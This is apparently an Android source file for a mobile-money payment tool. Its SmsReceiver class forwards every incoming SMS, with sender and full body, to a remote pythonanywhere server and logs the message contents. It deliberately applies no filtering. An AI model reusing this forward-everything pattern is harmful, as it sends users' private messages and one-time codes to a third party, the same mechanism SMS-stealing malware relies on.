package com.ghosttester.kumbukumbu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/mixx-sms-payment";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "📱 SMS RECEIVED - STARTING PROCESS");

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();

                    Log.d(TAG, "📨 SMS From: " + sender);
                    Log.d(TAG, "💬 SMS Body: " + messageBody);

                    // TUMBA SMS ZOTE BILA KUBAGUA - SERVER NDIYO ITAKAYE DETECT
                    Log.d(TAG, "✅ SENDING ALL SMS TO SERVER FOR PROCESSING");
                    sendToServer(sender, messageBody);
                }
            }
        }
    }

    private void sendToServer(final String sender, final String messageBody) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    URL url = new URL(SERVER_URL);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setConnectTimeout(30000); // 30 seconds
                    conn.setReadTimeout(30000); // 30 seconds
                    conn.setDoOutput(true);

                    // Create JSON data
                    JSONObject jsonData = new JSONObject();
                    jsonData.put("sms_content", messageBody);
                    jsonData.put("sender_number", sender);
                    jsonData.put("timestamp", System.currentTimeMillis());

                    String jsonString = jsonData.toString();

                    Log.d(TAG, "🌐 Sending to server: " + SERVER_URL);
                    Log.d(TAG, "📤 Data length: " + messageBody.length() + " characters");

                    // Write data
                    OutputStream os = conn.getOutputStream();
                    os.write(jsonString.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "📥 Server Response Code: " + responseCode);

                    // Read response
                    BufferedReader br = new BufferedReader(new InputStreamReader(
                            responseCode == 200 ? conn.getInputStream() : conn.getErrorStream(),
                            "UTF-8"
                    ));
                    String responseLine;
                    StringBuilder response = new StringBuilder();
                    while ((responseLine = br.readLine()) != null) {
                        response.append(responseLine);
                    }
                    br.close();

                    Log.d(TAG, "📨 Server Response: " + response.toString());

                    if (responseCode == 200) {
                        Log.d(TAG, "✅ SMS successfully sent to server");
                    } else {
                        Log.e(TAG, "❌ Server returned error: " + responseCode);
                    }

                } catch (Exception e) {
                    Log.e(TAG, "🚨 ERROR sending to server: " + e.getMessage());
                    e.printStackTrace();
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }
            }
        }).start();
    }
}
